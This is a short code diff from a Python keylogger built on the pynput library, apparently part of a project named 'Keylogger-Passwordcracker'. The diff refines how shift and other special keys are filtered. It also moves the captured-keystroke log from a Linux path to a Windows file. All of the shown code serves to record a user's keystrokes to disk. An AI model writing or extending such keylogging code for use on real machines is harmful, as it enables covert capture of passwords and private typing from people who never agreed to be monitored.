@@ -4,7 +4,7 @@ from pynput import keyboard
 
 # Checks for "Key." keys
 def ispecial(value):
-    if "Key." in value:
+    if "Key." in value and value != "Key.shift":
         return True
 
     else:
@@ -35,8 +35,8 @@ def write(key):
     keydata = str(key)
 
     # With file open with reading and writing permissions write and close the 'keydata' as sting characters
-    with open('/home/l3phant/PycharmProjects/Ckeylogger/Datat.txt', 'a') as file:
-        if nospecial(keydata) == False or "Key.shift" in keydata:
+    with open('D:\Programming\python\Keylogger-Passwordcracker\Raw_Datat.txt', 'a') as file:
+        if (nospecial(keydata) == False or "Key.shift" in keydata) and ispecial(keydata) == False:
             file.write(keydata)
 
         if ispecial(keydata) == True and keydata != "Key.shift":
